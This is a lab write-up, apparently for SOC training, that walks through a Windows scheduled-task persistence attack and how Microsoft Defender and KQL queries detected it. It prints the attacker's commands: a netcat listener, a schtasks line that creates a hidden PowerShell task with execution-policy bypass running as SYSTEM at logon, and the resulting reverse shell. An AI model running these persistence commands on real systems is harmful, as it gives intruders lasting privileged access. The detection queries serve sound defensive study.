# Persistence via Scheduled Task & Reverse Shell

## Scenario Description

After gaining initial access and escalating privileges on the domain-joined Windows workstation `target-PC.mylab.local`, the attacker established persistence using a Windows Scheduled Task.

The attacker created a scheduled task named `UpdateTask` that executes a PowerShell script located at:

```text
C:\ProgramData\update.ps1
```

The task was configured to run at user logon under the `SYSTEM` account, allowing the PowerShell payload to execute with elevated privileges.

The attacker then manually executed the scheduled task and established an outbound connection from the compromised Windows endpoint to the Kali Linux attacker machine over TCP port `4444`.

## MITRE ATT&CK Mapping

* **Tactics:** Persistence, Privilege Escalation, Execution
* **Technique:** Scheduled Task/Job: Scheduled Task — **T1053.005**
* **Technique:** Command and Scripting Interpreter: PowerShell — **T1059.001**
* **Technique:** Windows Command Shell — **T1059.003**

## Execution Steps

### Listener Setup — Kali Linux

A Netcat listener was configured on the Kali attacker machine to receive the outbound connection from the compromised Windows endpoint:

```bash
nc -lvnp 4444
```

The listener received a connection from:

```text
192.168.10.132
```

to the Kali attacker machine:

```text
192.168.10.133:4444
```

The resulting PowerShell session was running on:

```text
target-PC
```

The attacker verified the execution context:

```powershell
whoami
```

Output:

```text
nt authority\system
```

The hostname was also verified:

```powershell
hostname
```

Output:

```text
target-PC
```

![Reverse Shell Connection](../../images/persistence/attacker-persistance-nc.png)

### PowerShell Script Creation

A PowerShell script was created on the compromised endpoint and stored under:

```text
C:\ProgramData\update.ps1
```

Microsoft Defender telemetry confirmed the creation of the file.

The `DeviceFileEvents` investigation showed:

```text
ActionType: FileCreated
FileName: update.ps1
FolderPath: C:\ProgramData\update.ps1
InitiatingProcessFileName: powershell.exe
```

![PowerShell File Creation](../../images/persistence/edr-sch-file-creation-cmd.png)

### Scheduled Task Creation

The attacker created a scheduled task named:

```text
UpdateTask
```

The task was created using `schtasks.exe` and configured to execute PowerShell with hidden window execution, non-interactive mode, execution-policy bypass, and the `update.ps1` payload.

The observed command line was:

```powershell
schtasks.exe /create /tn "UpdateTask" /tr "powershell.exe -WindowStyle Hidden -NoP -NonI -Exec Bypass -File C:\ProgramData\update.ps1" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /f
```

Microsoft Defender telemetry identified the process chain:

```text
powershell.exe
    ↓
schtasks.exe
```

and recorded the creation of the `UpdateTask` scheduled task.

![Scheduled Task Creation Command](../../images/persistence/edr-sch-task-creation-cmd.png)

### Scheduled Task Verification

The scheduled task was queried directly from the Windows endpoint:

```powershell
schtasks /query /tn "UpdateTask" /v /fo list
```

The output confirmed:

```text
TaskName:              \UpdateTask
Status:                Ready
Author:                MYLAB\jsmith
Task To Run:           powershell.exe -WindowStyle Hidden -NoP -NonI -Exec Bypass -File C:\ProgramData\update.ps1
Scheduled Task State:  Enabled
Run As User:           SYSTEM
Schedule Type:         At logon time
```

This confirmed that `UpdateTask` was enabled and configured to execute at user logon under the `SYSTEM` account.

![Scheduled Task Verification](../../images/persistence/attacker-sch-task.png)

### Task Execution and Verification

The scheduled task was manually triggered to validate the persistence mechanism:

```powershell
schtasks /run /tn "UpdateTask"
```

Microsoft Defender telemetry recorded the execution of `schtasks.exe` and the creation of the scheduled task.

![Scheduled Task Execution](../../images/persistence/edr-sch-task-creation.png)

The resulting outbound connection was received by the Kali listener on port `4444`.

The resulting PowerShell process was verified as running under:

```text
NT AUTHORITY\SYSTEM
```

## Microsoft Defender Investigation

### Scheduled Task Creation

Microsoft Defender XDR identified the scheduled task creation and mapped the activity to:

```text
T1053.005 — Scheduled Task
```

The event showed:

```text
Event:
powershell.exe created the scheduled task UpdateTask by invoking schtasks.exe

Action type:
SchTasksLaunch

User:
MYLAB\jsmith

Task name:
UpdateTask

Operation type:
Create
```

The observed process chain was:

```text
userinit.exe
    ↓
explorer.exe
    ↓
powershell.exe
    ↓
schtasks.exe
```

![Microsoft Defender Scheduled Task Detection](../../images/persistence/sentinel-sch-task-creation.png)

### KQL Investigation — Scheduled Task Creation

The following query was used to investigate Windows Security Event ID `4698` and extract the scheduled task details:

```kql
SecurityEvent
| where Computer contains "target-pc"
| where EventID == 4698
| where EventData has "UpdateTask"
| extend TaskName = extract(@"<Data Name=""TaskName"">(.*?)</Data>", 1, EventData)
| extend Command = extract(@"&lt;Command&gt;(.*?)&lt;/Command&gt;", 1, EventData)
| extend Arguments = extract(@"&lt;Arguments&gt;(.*?)&lt;/Arguments&gt;", 1, EventData)
| extend Domain = extract(@"<Data Name=""SubjectDomainName"">(.*?)</Data>", 1, EventData)
| extend User = extract(@"<Data Name=""SubjectUserName"">(.*?)</Data>", 1, EventData)
| extend Account = strcat(Domain, @"\", User)
| project TimeGenerated, Computer, Account, TaskName, Command, Arguments
```

The query returned:

```text
Computer: target-PC.mylab.local
Account:  MYLAB\jsmith
TaskName: \UpdateTask
Command:  powershell.exe
Arguments: -WindowStyle Hidden -NoP -NonI -Exec Bypass -File C:\ProgramData\update.ps1
```

![Security Event 4698 Investigation](../../images/persistence/sentinel-sch-task-creation.png)

### Process Investigation

The following query was used to identify `schtasks.exe` process activity:

```kql
DeviceProcessEvents
| where DeviceName == "target-pc.mylab.local"
| where FileName =~ "schtasks.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

The results showed the creation and execution of `UpdateTask`.

Observed activity included:

```text
schtasks.exe /create /tn UpdateTask
```

and:

```text
schtasks.exe /run /tn UpdateTask
```

![EDR Scheduled Task Process Activity](../../images/persistence/edr-sch-task-creation-cmd.png)

### Network Connection Investigation

The outbound connection was investigated using `DeviceNetworkEvents`:

```kql
DeviceNetworkEvents
| where DeviceName == "target-pc.mylab.local"
| where RemotePort == 4444
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort
```

The results confirmed a network connection from:

```text
Device:
target-PC.mylab.local

Process:
powershell.exe

Remote IP:
192.168.10.133

Remote Port:
4444
```

This correlated the PowerShell execution with the Kali Netcat listener.

![EDR Network Connection](../../images/persistence/edr-network-connecition.png)

## Windows Event Telemetry

| Event / Source             | Description                  | Observed Evidence                        |
| -------------------------- | ---------------------------- | ---------------------------------------- |
| **Security Event ID 4698** | Scheduled task created       | `UpdateTask`                             |
| **Microsoft Defender XDR** | Scheduled task detection     | `T1053.005 Scheduled Task`               |
| **DeviceProcessEvents**    | Process creation telemetry   | `powershell.exe` → `schtasks.exe`        |
| **DeviceFileEvents**       | File creation telemetry      | `C:\ProgramData\update.ps1`              |
| **DeviceNetworkEvents**    | Network connection telemetry | `powershell.exe` → `192.168.10.133:4444` |
| **Windows Task Scheduler** | Task configuration           | `SYSTEM`, `At logon time`                |

## Investigation Timeline

```text
Initial Access
      ↓
PowerShell Execution
      ↓
update.ps1 Created
      ↓
C:\ProgramData\update.ps1
      ↓
schtasks.exe
      ↓
UpdateTask Created
      ↓
Task Configured for User Logon
      ↓
SYSTEM Execution
      ↓
UpdateTask Manually Executed
      ↓
PowerShell Execution
      ↓
192.168.10.133:4444
      ↓
Reverse Shell
      ↓
NT AUTHORITY\SYSTEM
```

## Evidence Collected

### Attacker — Reverse Shell

![Attacker Reverse Shell](../../images/persistence/attacker-persistance-nc.png)

### Attacker — Scheduled Task

![Attacker Scheduled Task](../../images/persistence/attacker-sch-task.png)

### EDR — File Creation

![EDR File Creation](../../images/persistence/edr-sch-file-creation-cmd.png)

### EDR — Scheduled Task Creation

![EDR Scheduled Task Creation](../../images/persistence/edr-sch-task-creation.png)

### EDR — Scheduled Task Command

![EDR Scheduled Task Command](../../images/persistence/edr-sch-task-creation-cmd.png)

### EDR — Network Connection

![EDR Network Connection](../../images/persistence/edr-network-connecition.png)

### Microsoft Defender — Scheduled Task Detection

![Microsoft Defender Scheduled Task Detection](../../images/persistence/sentinel-sch-task-creation.png)

## Result

The attacker successfully established persistence on `target-PC.mylab.local` using a Windows Scheduled Task named `UpdateTask`.

The task was configured to execute:

```text
powershell.exe -WindowStyle Hidden -NoP -NonI -Exec Bypass -File C:\ProgramData\update.ps1
```

The task was configured to run:

```text
At logon time
```

under:

```text
NT AUTHORITY\SYSTEM
```

The execution generated multiple observable artifacts across Windows and Microsoft Defender telemetry, including scheduled task creation, PowerShell execution, file creation, process activity, and an outbound network connection to the Kali listener.

This scenario demonstrates how a SOC analyst can correlate **Windows Security logs, process telemetry, file telemetry, network telemetry, and Microsoft Defender XDR detections** to reconstruct a persistence attack chain.
